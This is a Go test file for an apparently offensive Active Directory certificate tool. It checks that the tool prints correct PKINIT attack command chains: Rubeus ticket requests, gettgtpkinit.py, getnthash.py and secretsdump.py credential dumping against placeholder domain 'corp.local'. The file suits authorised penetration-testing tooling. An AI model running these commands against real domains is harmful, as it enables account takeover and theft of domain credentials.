package pki

import (
	"bytes"
	"os"
	"strings"
	"testing"
)

// captureStdout runs fn and returns whatever it printed to stdout.
func captureStdout(t *testing.T, fn func()) string {
	t.Helper()
	old := os.Stdout
	r, w, _ := os.Pipe()
	os.Stdout = w
	fn()
	w.Close()
	os.Stdout = old
	var buf bytes.Buffer
	buf.ReadFrom(r)
	return buf.String()
}

func TestPrintPKINITCommands_WithPFX(t *testing.T) {
	info := &PKINITInfo{
		PFXPath:   "/tmp/admin.pfx",
		DC:        "dc01.corp.local",
		Domain:    "corp.local",
		TargetUPN: "admin@corp.local",
	}

	out := captureStdout(t, func() { PrintPKINITCommands(info) })

	// certipy-ad command
	if !strings.Contains(out, "certipy-ad auth -pfx /tmp/admin.pfx -dc-ip <DC_IP> -domain corp.local") {
		t.Error("missing or incorrect certipy-ad auth command")
	}
	// Rubeus — must use sAMAccountName (admin), not full UPN
	if !strings.Contains(out, "Rubeus.exe asktgt /user:admin /certificate:/tmp/admin.pfx /ptt /getcredentials") {
		t.Error("missing or incorrect Rubeus asktgt command")
	}
	// Rubeus should NOT have /password: when PFXPass is empty
	if strings.Contains(out, "/password:") {
		t.Error("Rubeus should not have /password: when PFXPass is empty")
	}
	// gettgtpkinit.py — positional args BEFORE flags
	if !strings.Contains(out, "gettgtpkinit.py corp.local/admin admin.ccache -cert-pfx /tmp/admin.pfx") {
		t.Error("gettgtpkinit.py has wrong syntax — positional args must come before flags")
	}
	// secretsdump
	if !strings.Contains(out, "secretsdump.py -k -no-pass -dc-ip <DC_IP> corp.local/admin@corp.local") {
		t.Error("missing or incorrect secretsdump.py command")
	}
}

func TestPrintPKINITCommands_WithPFXPassword(t *testing.T) {
	info := &PKINITInfo{
		PFXPath:   "/tmp/admin.pfx",
		PFXPass:   "s3cret",
		DC:        "dc01",
		Domain:    "corp.local",
		TargetUPN: "admin@corp.local",
	}

	out := captureStdout(t, func() { PrintPKINITCommands(info) })

	// Rubeus must include /password:
	if !strings.Contains(out, "/password:s3cret") {
		t.Error("Rubeus missing /password: flag when PFXPass is set")
	}
	// gettgtpkinit.py must include -pfx-pass with password
	if !strings.Contains(out, "-pfx-pass 's3cret'") {
		t.Error("gettgtpkinit.py missing -pfx-pass with password value")
	}
}

func TestPrintPKINITCommands_WithCertKeyNoPFX(t *testing.T) {
	info := &PKINITInfo{
		CertPath:  "/tmp/admin.crt",
		KeyPath:   "/tmp/admin.key",
		DC:        "dc01",
		Domain:    "corp.local",
		TargetUPN: "admin@corp.local",
	}

	out := captureStdout(t, func() { PrintPKINITCommands(info) })

	// Should show openssl pkcs12 conversion command
	if !strings.Contains(out, "openssl pkcs12 -export -in /tmp/admin.crt -inkey /tmp/admin.key -out /tmp/admin.pfx") {
		t.Error("missing or incorrect openssl pkcs12 conversion command")
	}
	// Should NOT show gettgtpkinit.py (no PFX available yet)
	if strings.Contains(out, "gettgtpkinit.py") {
		t.Error("should not show gettgtpkinit.py when only cert+key provided (no PFX)")
	}
}

func TestPrintUnPACCommands_ArgOrder(t *testing.T) {
	out := captureStdout(t, func() {
		PrintUnPACCommands("/tmp/admin.pfx", "", "dc01", "corp.local", "admin@corp.local")
	})

	// gettgtpkinit.py — positional args BEFORE flags
	if !strings.Contains(out, "gettgtpkinit.py corp.local/admin admin.ccache -cert-pfx /tmp/admin.pfx") {
		t.Errorf("gettgtpkinit.py wrong arg order. Got:\n%s", out)
	}
	// getnthash.py — positional args BEFORE flags
	if !strings.Contains(out, "getnthash.py corp.local/admin -key <AS-REP-key>") {
		t.Errorf("getnthash.py wrong arg order. Got:\n%s", out)
	}
	// Rubeus must use sAMAccountName (admin), not full UPN
	if !strings.Contains(out, "Rubeus.exe asktgt /user:admin /certificate:/tmp/admin.pfx") {
		t.Error("Rubeus /user: should use sAMAccountName, not full UPN")
	}
}

func TestPrintUnPACCommands_WithPassword(t *testing.T) {
	out := captureStdout(t, func() {
		PrintUnPACCommands("/tmp/admin.pfx", "mypass", "dc01", "corp.local", "admin@corp.local")
	})

	if !strings.Contains(out, "/password:mypass") {
		t.Error("Rubeus missing /password: when pfxPass is set")
	}
	if !strings.Contains(out, "-pfx-pass 'mypass'") {
		t.Error("gettgtpkinit.py missing -pfx-pass with password value")
	}
}

func TestGeneratePKINITScript_ArgOrder(t *testing.T) {
	info := &PKINITInfo{
		PFXPath:   "/tmp/admin.pfx",
		DC:        "dc01.corp.local",
		Domain:    "corp.local",
		TargetUPN: "admin@corp.local",
	}

	scriptPath := t.TempDir() + "/pkinit.sh"
	if err := GeneratePKINITScript(info, scriptPath); err != nil {
		t.Fatalf("GeneratePKINITScript: %v", err)
	}

	data, err := os.ReadFile(scriptPath)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	script := string(data)

	// gettgtpkinit.py in the script must have positional args before flags
	if !strings.Contains(script, `gettgtpkinit.py "${DOMAIN}/${USER}" "${USER}.ccache" -cert-pfx "$PFX"`) {
		t.Errorf("script has wrong gettgtpkinit.py arg order:\n%s", script)
	}

	// Script should be executable
	fi, _ := os.Stat(scriptPath)
	if fi.Mode()&0100 == 0 {
		t.Error("script should be executable")
	}
}
